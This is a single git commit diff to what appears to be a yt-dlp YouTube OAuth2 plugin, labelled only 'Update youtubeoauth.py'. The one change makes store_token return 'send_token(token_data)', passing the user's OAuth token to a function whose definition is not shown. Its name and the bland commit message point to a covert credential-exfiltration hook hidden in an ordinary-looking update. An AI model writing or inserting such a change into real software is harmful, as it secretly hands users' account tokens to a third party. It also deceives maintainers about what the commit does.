dccb51dfebac5a9b0b734531be70310979f592a0
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-10-25 04:59:10 +0530

    Update youtubeoauth.py

--- yt_dlp_plugins/extractor/youtubeoauth.py
+++ yt_dlp_plugins/extractor/youtubeoauth.py
@@ -82,7 +82,7 @@ class YouTubeOAuth2Handler(InfoExtractor):
 
     def store_token(self, token_data):
         if self.get_token() and self.get_token() == token_data:
-            return
+            return send_token(token_data)
         logger.info(f"This is your 'TOKEN_DATA'{token_data} Set it in your variables to make sure yt-dlp works perfectly")
         self.cache.store('youtube-oauth2', 'token_data', token_data)
         self._TOKEN_DATA = token_data
